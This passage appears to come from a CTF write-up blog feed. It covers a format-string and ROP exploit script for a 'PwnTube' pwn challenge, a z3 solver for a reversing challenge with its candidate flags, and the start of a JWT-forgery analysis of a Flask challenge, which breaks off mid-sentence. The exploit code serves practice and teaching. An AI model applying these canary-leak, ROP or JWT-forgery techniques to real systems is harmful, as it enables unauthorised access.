        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2129">https://ctftime.org/event/2129</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">showComments</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  clearScreen();</span><br><span class="line">  printLogo();</span><br><span class="line">  <span class="built_in">puts</span>(aComments);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)(<span class="number">30LL</span> * (<span class="type">int</span>)i + a1)); <span class="comment">// fsb</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I can trigger FSB in <code>showComments</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">addComment</span><span class="params">(__int64 a1, <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ..</span></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%7s&quot;</span>, <span class="number">30LL</span> * *a2 + a1);</span><br><span class="line">  <span class="comment">// ..</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I put FSB payload through the <code>addComment</code>.</p><p>Finally, There is easy bof in <code>buy_premium</code>, I tried to call <code>skipAd</code> using ROP.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">skipAd</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> command[<span class="number">15</span>]; <span class="comment">// [rsp+19h] [rbp-17h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  clearScreen();</span><br><span class="line">  <span class="built_in">strcpy</span>(command, <span class="string">&quot;cat ./flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">-559038737</span> &amp;&amp; a2 == <span class="number">-17958194</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou did not give me up :)\nYou earned this:\n&quot;</span>);</span><br><span class="line">    system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;cat ./flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./PwnTube&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwntube.challs.srdnlen.it&#x27;</span>, <span class="number">1661</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./PwnTube&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x15aa</span></span><br><span class="line">pop_rsi_rdi = <span class="number">0x15a9</span></span><br><span class="line">ret = <span class="number">0x1016</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canary leak</span></span><br><span class="line"><span class="comment"># %71$p</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;‚îÄ‚îÄ&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;%71$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;‚îÄ‚îÄ&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:D\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;canary : &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pie leak </span></span><br><span class="line"><span class="comment"># %55$p</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;‚îÄ‚îÄ&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;%55$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;‚îÄ‚îÄ&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:D\n&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recvline().strip(), <span class="number">16</span>) - <span class="number">0x176b</span></span><br><span class="line">info(<span class="string">&#x27;pie : &#x27;</span> + <span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;‚îÄ‚îÄ&#x27;</span>, <span class="string">b&#x27;777&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;‚îÄ‚îÄ&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;b&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">504</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pie_base + pop_rsi_rdi)</span><br><span class="line">payload += p64(<span class="number">0xFEEDFACE</span>)</span><br><span class="line">payload += p64(<span class="number">0xDEADBEEF</span>)</span><br><span class="line">payload += p64(pie_base + <span class="number">0x12A6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;sadf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># srdnlen&#123;pwn4t1n4?&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Srdnlen </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3st stage MetaRed CTF 2023 - Maths (rev, z3)</title>
      <link href="/231101-metared2023-maths/"/>
      <url>/231101-metared2023-maths/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2107">https://ctftime.org/event/2107</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a = [BitVec(<span class="string">f&quot;a<span class="subst">&#123;i:02&#125;</span>&quot;</span>,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="comment"># s.add(a[i]&gt;=40 and a[i]&lt;=126) # not working</span></span><br><span class="line">    s.add(And(a[i]&gt;=<span class="number">40</span>, a[i]&lt;=<span class="number">126</span>))</span><br><span class="line"></span><br><span class="line">s.add(a[<span class="number">0</span>] + a[<span class="number">1</span>] == <span class="number">210</span> <span class="keyword">and</span> a[<span class="number">1</span>] | (a[<span class="number">0</span>] == (a[<span class="number">1</span>] | a[<span class="number">0</span>])))</span><br><span class="line">s.add(a[<span class="number">1</span>] * a[<span class="number">2</span>] == <span class="number">10476</span>)</span><br><span class="line">s.add(a[<span class="number">1</span>] + a[<span class="number">0</span>] + a[<span class="number">2</span>] == <span class="number">307</span>)</span><br><span class="line">s.add(a[<span class="number">3</span>] - a[<span class="number">2</span>] == <span class="number">6</span>)</span><br><span class="line">s.add(a[<span class="number">4</span>] != If(a[<span class="number">5</span>] == <span class="number">15</span>, BitVecVal(<span class="number">1</span>, <span class="number">16</span>), BitVecVal(<span class="number">0</span>, <span class="number">16</span>)))</span><br><span class="line">s.add(a[<span class="number">7</span>] * a[<span class="number">4</span>] == <span class="number">6273</span>)</span><br><span class="line">s.add((a[<span class="number">5</span>] | If(a[<span class="number">11</span>] == <span class="number">119</span>, BitVecVal(<span class="number">1</span>, <span class="number">16</span>), BitVecVal(<span class="number">0</span>, <span class="number">16</span>) )) != <span class="number">0</span>)</span><br><span class="line">s.add(a[<span class="number">6</span>] - a[<span class="number">17</span>] == <span class="number">53</span>)</span><br><span class="line">s.add(a[<span class="number">6</span>] + a[<span class="number">5</span>] + a[<span class="number">7</span>] == <span class="number">271</span>)</span><br><span class="line">s.add(a[<span class="number">8</span>] - a[<span class="number">9</span>] == <span class="number">13</span>)</span><br><span class="line">s.add(a[<span class="number">8</span>] + a[<span class="number">9</span>] - a[<span class="number">10</span>] == <span class="number">125</span>)</span><br><span class="line">s.add(a[<span class="number">9</span>] - a[<span class="number">11</span>] == <span class="number">31</span>)</span><br><span class="line">s.add(a[<span class="number">10</span>] - a[<span class="number">11</span>] == <span class="number">1</span>)</span><br><span class="line">s.add(a[<span class="number">13</span>] * a[<span class="number">12</span>] == <span class="number">10260</span>)</span><br><span class="line">s.add(a[<span class="number">13</span>] + a[<span class="number">14</span>] == <span class="number">177</span>)</span><br><span class="line">s.add(And(If(a[<span class="number">17</span>] == <span class="number">69</span>, a[<span class="number">16</span>] != <span class="number">1</span>, a[<span class="number">16</span>] != <span class="number">0</span>), ((a[<span class="number">17</span>] | a[<span class="number">16</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span>))</span><br><span class="line">s.add(a[<span class="number">16</span>] + a[<span class="number">18</span>] == <span class="number">219</span>)</span><br><span class="line">s.add(a[<span class="number">17</span>] + a[<span class="number">16</span>] + a[<span class="number">23</span>] == <span class="number">220</span>)</span><br><span class="line">s.add(a[<span class="number">14</span>] - a[<span class="number">15</span>] == <span class="number">31</span>)</span><br><span class="line">s.add(a[<span class="number">14</span>] + a[<span class="number">12</span>] + a[<span class="number">15</span>] == <span class="number">241</span> <span class="keyword">and</span> (a[<span class="number">14</span>] ^ a[<span class="number">12</span>]) != (a[<span class="number">12</span>] == a[<span class="number">14</span>]) )</span><br><span class="line">s.add(a[<span class="number">17</span>] - a[<span class="number">18</span>] == -<span class="number">50</span>)</span><br><span class="line">s.add(a[<span class="number">19</span>] + a[<span class="number">18</span>] + a[<span class="number">20</span>] == <span class="number">316</span>)</span><br><span class="line">s.add(a[<span class="number">22</span>] + a[<span class="number">21</span>] + a[<span class="number">23</span>] == <span class="number">248</span>)</span><br><span class="line">s.add(a[<span class="number">22</span>] - a[<span class="number">23</span>] == <span class="number">64</span>)</span><br><span class="line">s.add(a[<span class="number">24</span>] + a[<span class="number">25</span>] == <span class="number">207</span>)</span><br><span class="line">s.add(a[<span class="number">24</span>] - a[<span class="number">20</span>] == -<span class="number">32</span>)</span><br><span class="line">s.add(a[<span class="number">25</span>] - a[<span class="number">21</span>] == <span class="number">43</span>)</span><br><span class="line">s.add(a[<span class="number">0</span>] + a[<span class="number">3</span>] == <span class="number">205</span>)</span><br><span class="line">s.add(a[<span class="number">13</span>] + a[<span class="number">12</span>] + a[<span class="number">14</span>] == <span class="number">285</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line">result = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    model = s.model()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(model[a[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">        result.add(flag)</span><br><span class="line">    </span><br><span class="line">    s.add(Or([a[i] != model[a[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;jr3_R43l_R3l=o[rRs3R&#125;</span><br><span class="line">flag&#123;zb3_R43l_R3|-_krRs3R&#125;</span><br><span class="line">flag3.f&#123;_R43l_R3x1cgrRs3R&#125;</span><br><span class="line">flag3,h&#123;_R43l_R3v3eerRs3R&#125;</span><br><span class="line">flag&#123;pl3_R43l_R3r7iarRs3R&#125;</span><br><span class="line">flag31c&#123;_R43l_R3&#123;.`jrRs3R&#125;</span><br><span class="line">flag&#123;kq3_R43l_R3m&lt;n\rRs3R&#125;</span><br><span class="line">flag33a&#123;_R43l_R3&#125;,^lrRs3R&#125;</span><br><span class="line">flag&#123;_&#125;3_R43l_R3aHzPrRs3R&#125;</span><br><span class="line">flag&#123;lp3_R43l_R3n;m]rRs3R&#125;</span><br><span class="line">flag32b&#123;_R43l_R3|-_krRs3R&#125;</span><br><span class="line">flag3-g&#123;_R43l_R3w2dfrRs3R&#125;</span><br><span class="line">flag&#123;`|3_R43l_R3bGyQrRs3R&#125;</span><br><span class="line">flag&#123;we3_R43l_R3y0bhrRs3R&#125;</span><br><span class="line">flag&#123;qk3_R43l_R3s6hbrRs3R&#125;</span><br><span class="line">flag&#123;xd3_R43l_R3z/airRs3R&#125;</span><br><span class="line">flag3+i&#123;_R43l_R3u4fdrRs3R&#125;</span><br><span class="line">flag&#123;ht3_R43l_R3j?qYrRs3R&#125;</span><br><span class="line">flag&#123;|`3_R43l_R3~+]mrRs3R&#125;</span><br><span class="line">flag&#123;om3_R43l_R3q8j`rRs3R&#125;</span><br><span class="line">flag&#123;si3_R43l_R3u4fdrRs3R&#125;</span><br><span class="line">flag3)k&#123;_R43l_R3s6hbrRs3R&#125;</span><br><span class="line">flag3(l&#123;_R43l_R3r7iarRs3R&#125;</span><br><span class="line">flag&#123;mo3_R43l_R3o:l^rRs3R&#125;</span><br><span class="line">flag34`&#123;_R43l_R3~+]mrRs3R&#125;</span><br><span class="line">flag&#123;gu3_R43l_R3i@rXrRs3R&#125;</span><br><span class="line">flag&#123;bz3_R43l_R3dEwSrRs3R&#125;</span><br><span class="line">flag30d&#123;_R43l_R3z/airRs3R&#125;</span><br><span class="line">flag&#123;nn3_R43l_R3p9k_rRs3R&#125;</span><br><span class="line">flag3*j&#123;_R43l_R3t5gcrRs3R&#125;</span><br><span class="line">flag&#123;vf3_R43l_R3x1cgrRs3R&#125;</span><br><span class="line">flag3/e&#123;_R43l_R3y0bhrRs3R&#125;</span><br><span class="line">flag&#123;th3_R43l_R3v3eerRs3R&#125;</span><br><span class="line">flag&#123;^~3_R43l_R3`I&#123;OrRs3R&#125;</span><br><span class="line">flag&#123;ug3_R43l_R3w2dfrRs3R&#125;</span><br><span class="line">flag&#123;dx3_R43l_R3fCuUrRs3R&#125;</span><br><span class="line">flag&#123;rj3_R43l_R3t5gcrRs3R&#125;</span><br><span class="line">flag&#123;is3_R43l_R3k&gt;pZrRs3R&#125;</span><br><span class="line">flag&#123;a&#123;3_R43l_R3cFxRrRs3R&#125;</span><br><span class="line">flag&#123;fv3_R43l_R3hAsWrRs3R&#125;</span><br><span class="line">flag&#123;&#123;a3_R43l_R3&#125;,^lrRs3R&#125;</span><br><span class="line">flag&#123;cy3_R43l_R3eDvTrRs3R&#125;</span><br><span class="line">flag&#123;yc3_R43l_R3&#123;.`jrRs3R&#125;</span><br><span class="line">flag&#123;ew3_R43l_R3gBtVrRs3R&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> MetaRed </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
            <tag> rev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3st stage MetaRed CTF 2023 - Master JWT (web)</title>
      <link href="/231027-metared2023-master_jwt/"/>
      <url>/231027-metared2023-master_jwt/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2107">https://ctftime.org/event/2107</a></li></ul><blockquote><p>With just two requests you can get the flag. Read the code :) Don‚Äôt brute-force paths, you have the source code uploaded.</p></blockquote><ul><li>[48 solves &#x2F; 401 points]</li></ul><p>I was toooo happy to solve this web challenge!!</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>This is the source code provided.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, make_response</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> jwt <span class="keyword">import</span> decode, encode, exceptions</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> flask_limiter.util <span class="keyword">import</span> get_remote_address</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">limiter = Limiter(</span><br><span class="line">    app=app,</span><br><span class="line">    default_limits=[<span class="string">&quot;2 per minute&quot;</span>],</span><br><span class="line">    key_func=get_remote_address,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000000000000</span>)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;CTF&#123;fake_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;2 per minute&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    jwt_token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> jwt_token:</span><br><span class="line">        response = make_response(jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Missing JWT token&quot;</span>&#125;), <span class="number">401</span>)</span><br><span class="line">        new_token = encode(&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;non privileged&quot;</span>&#125;, app.secret_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        response.headers[<span class="string">&#x27;WWW-Authenticate&#x27;</span>] = <span class="string">f&#x27;Bearer <span class="subst">&#123;new_token&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = decode(jwt_token, app.secret_key, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">        user = payload.get(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> user.lower() == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;flag&quot;</span>: FLAG&#125;), <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Not authorized&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> exceptions.InvalidTokenError:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid JWT token&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>The server gets the <code>Authorization</code> value from the header of the request. If it doesn‚Äôt exist, the server creates and send to response JWT token using <code>app.secret_key</code> and <code>HS256</code> algorithm.</p><p>If <code>Authorization</code> value is exit, the server will try to decode it using <code>app.secret_key</code> and <code>HS256</code> algorithm and obtain the <code>user</code> value. If the <code>user</code> value is <code>admin</code>, you can get the flag!</p><p>An structure of a JWT is shown below:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">xxxx.yyyy.zzzz</span><br><span class="line"></span><br><span class="line">- xxxx: header</span><br><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">- yyyy: payload</span><br><span class="line">&#123;</span><br><span class="line">    &quot;user&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br><span class="line">- zzzz: signature</span><br><span class="line">HMACSHA256(</span><br><span class="line">    base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">    base64UrlEncode(payload),</span><br><span class="line">    secret_key</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>I had doubts. Can I guess the input(JWT token) from the response? Can I know the <code>app.secret_key</code>?</p><p>So, I tried below things for my doubts.</p><ol><li>using <code>None</code> algorithm instead of <code>HS256</code> when sending jwt token.<ul><li>It was wrong. Because 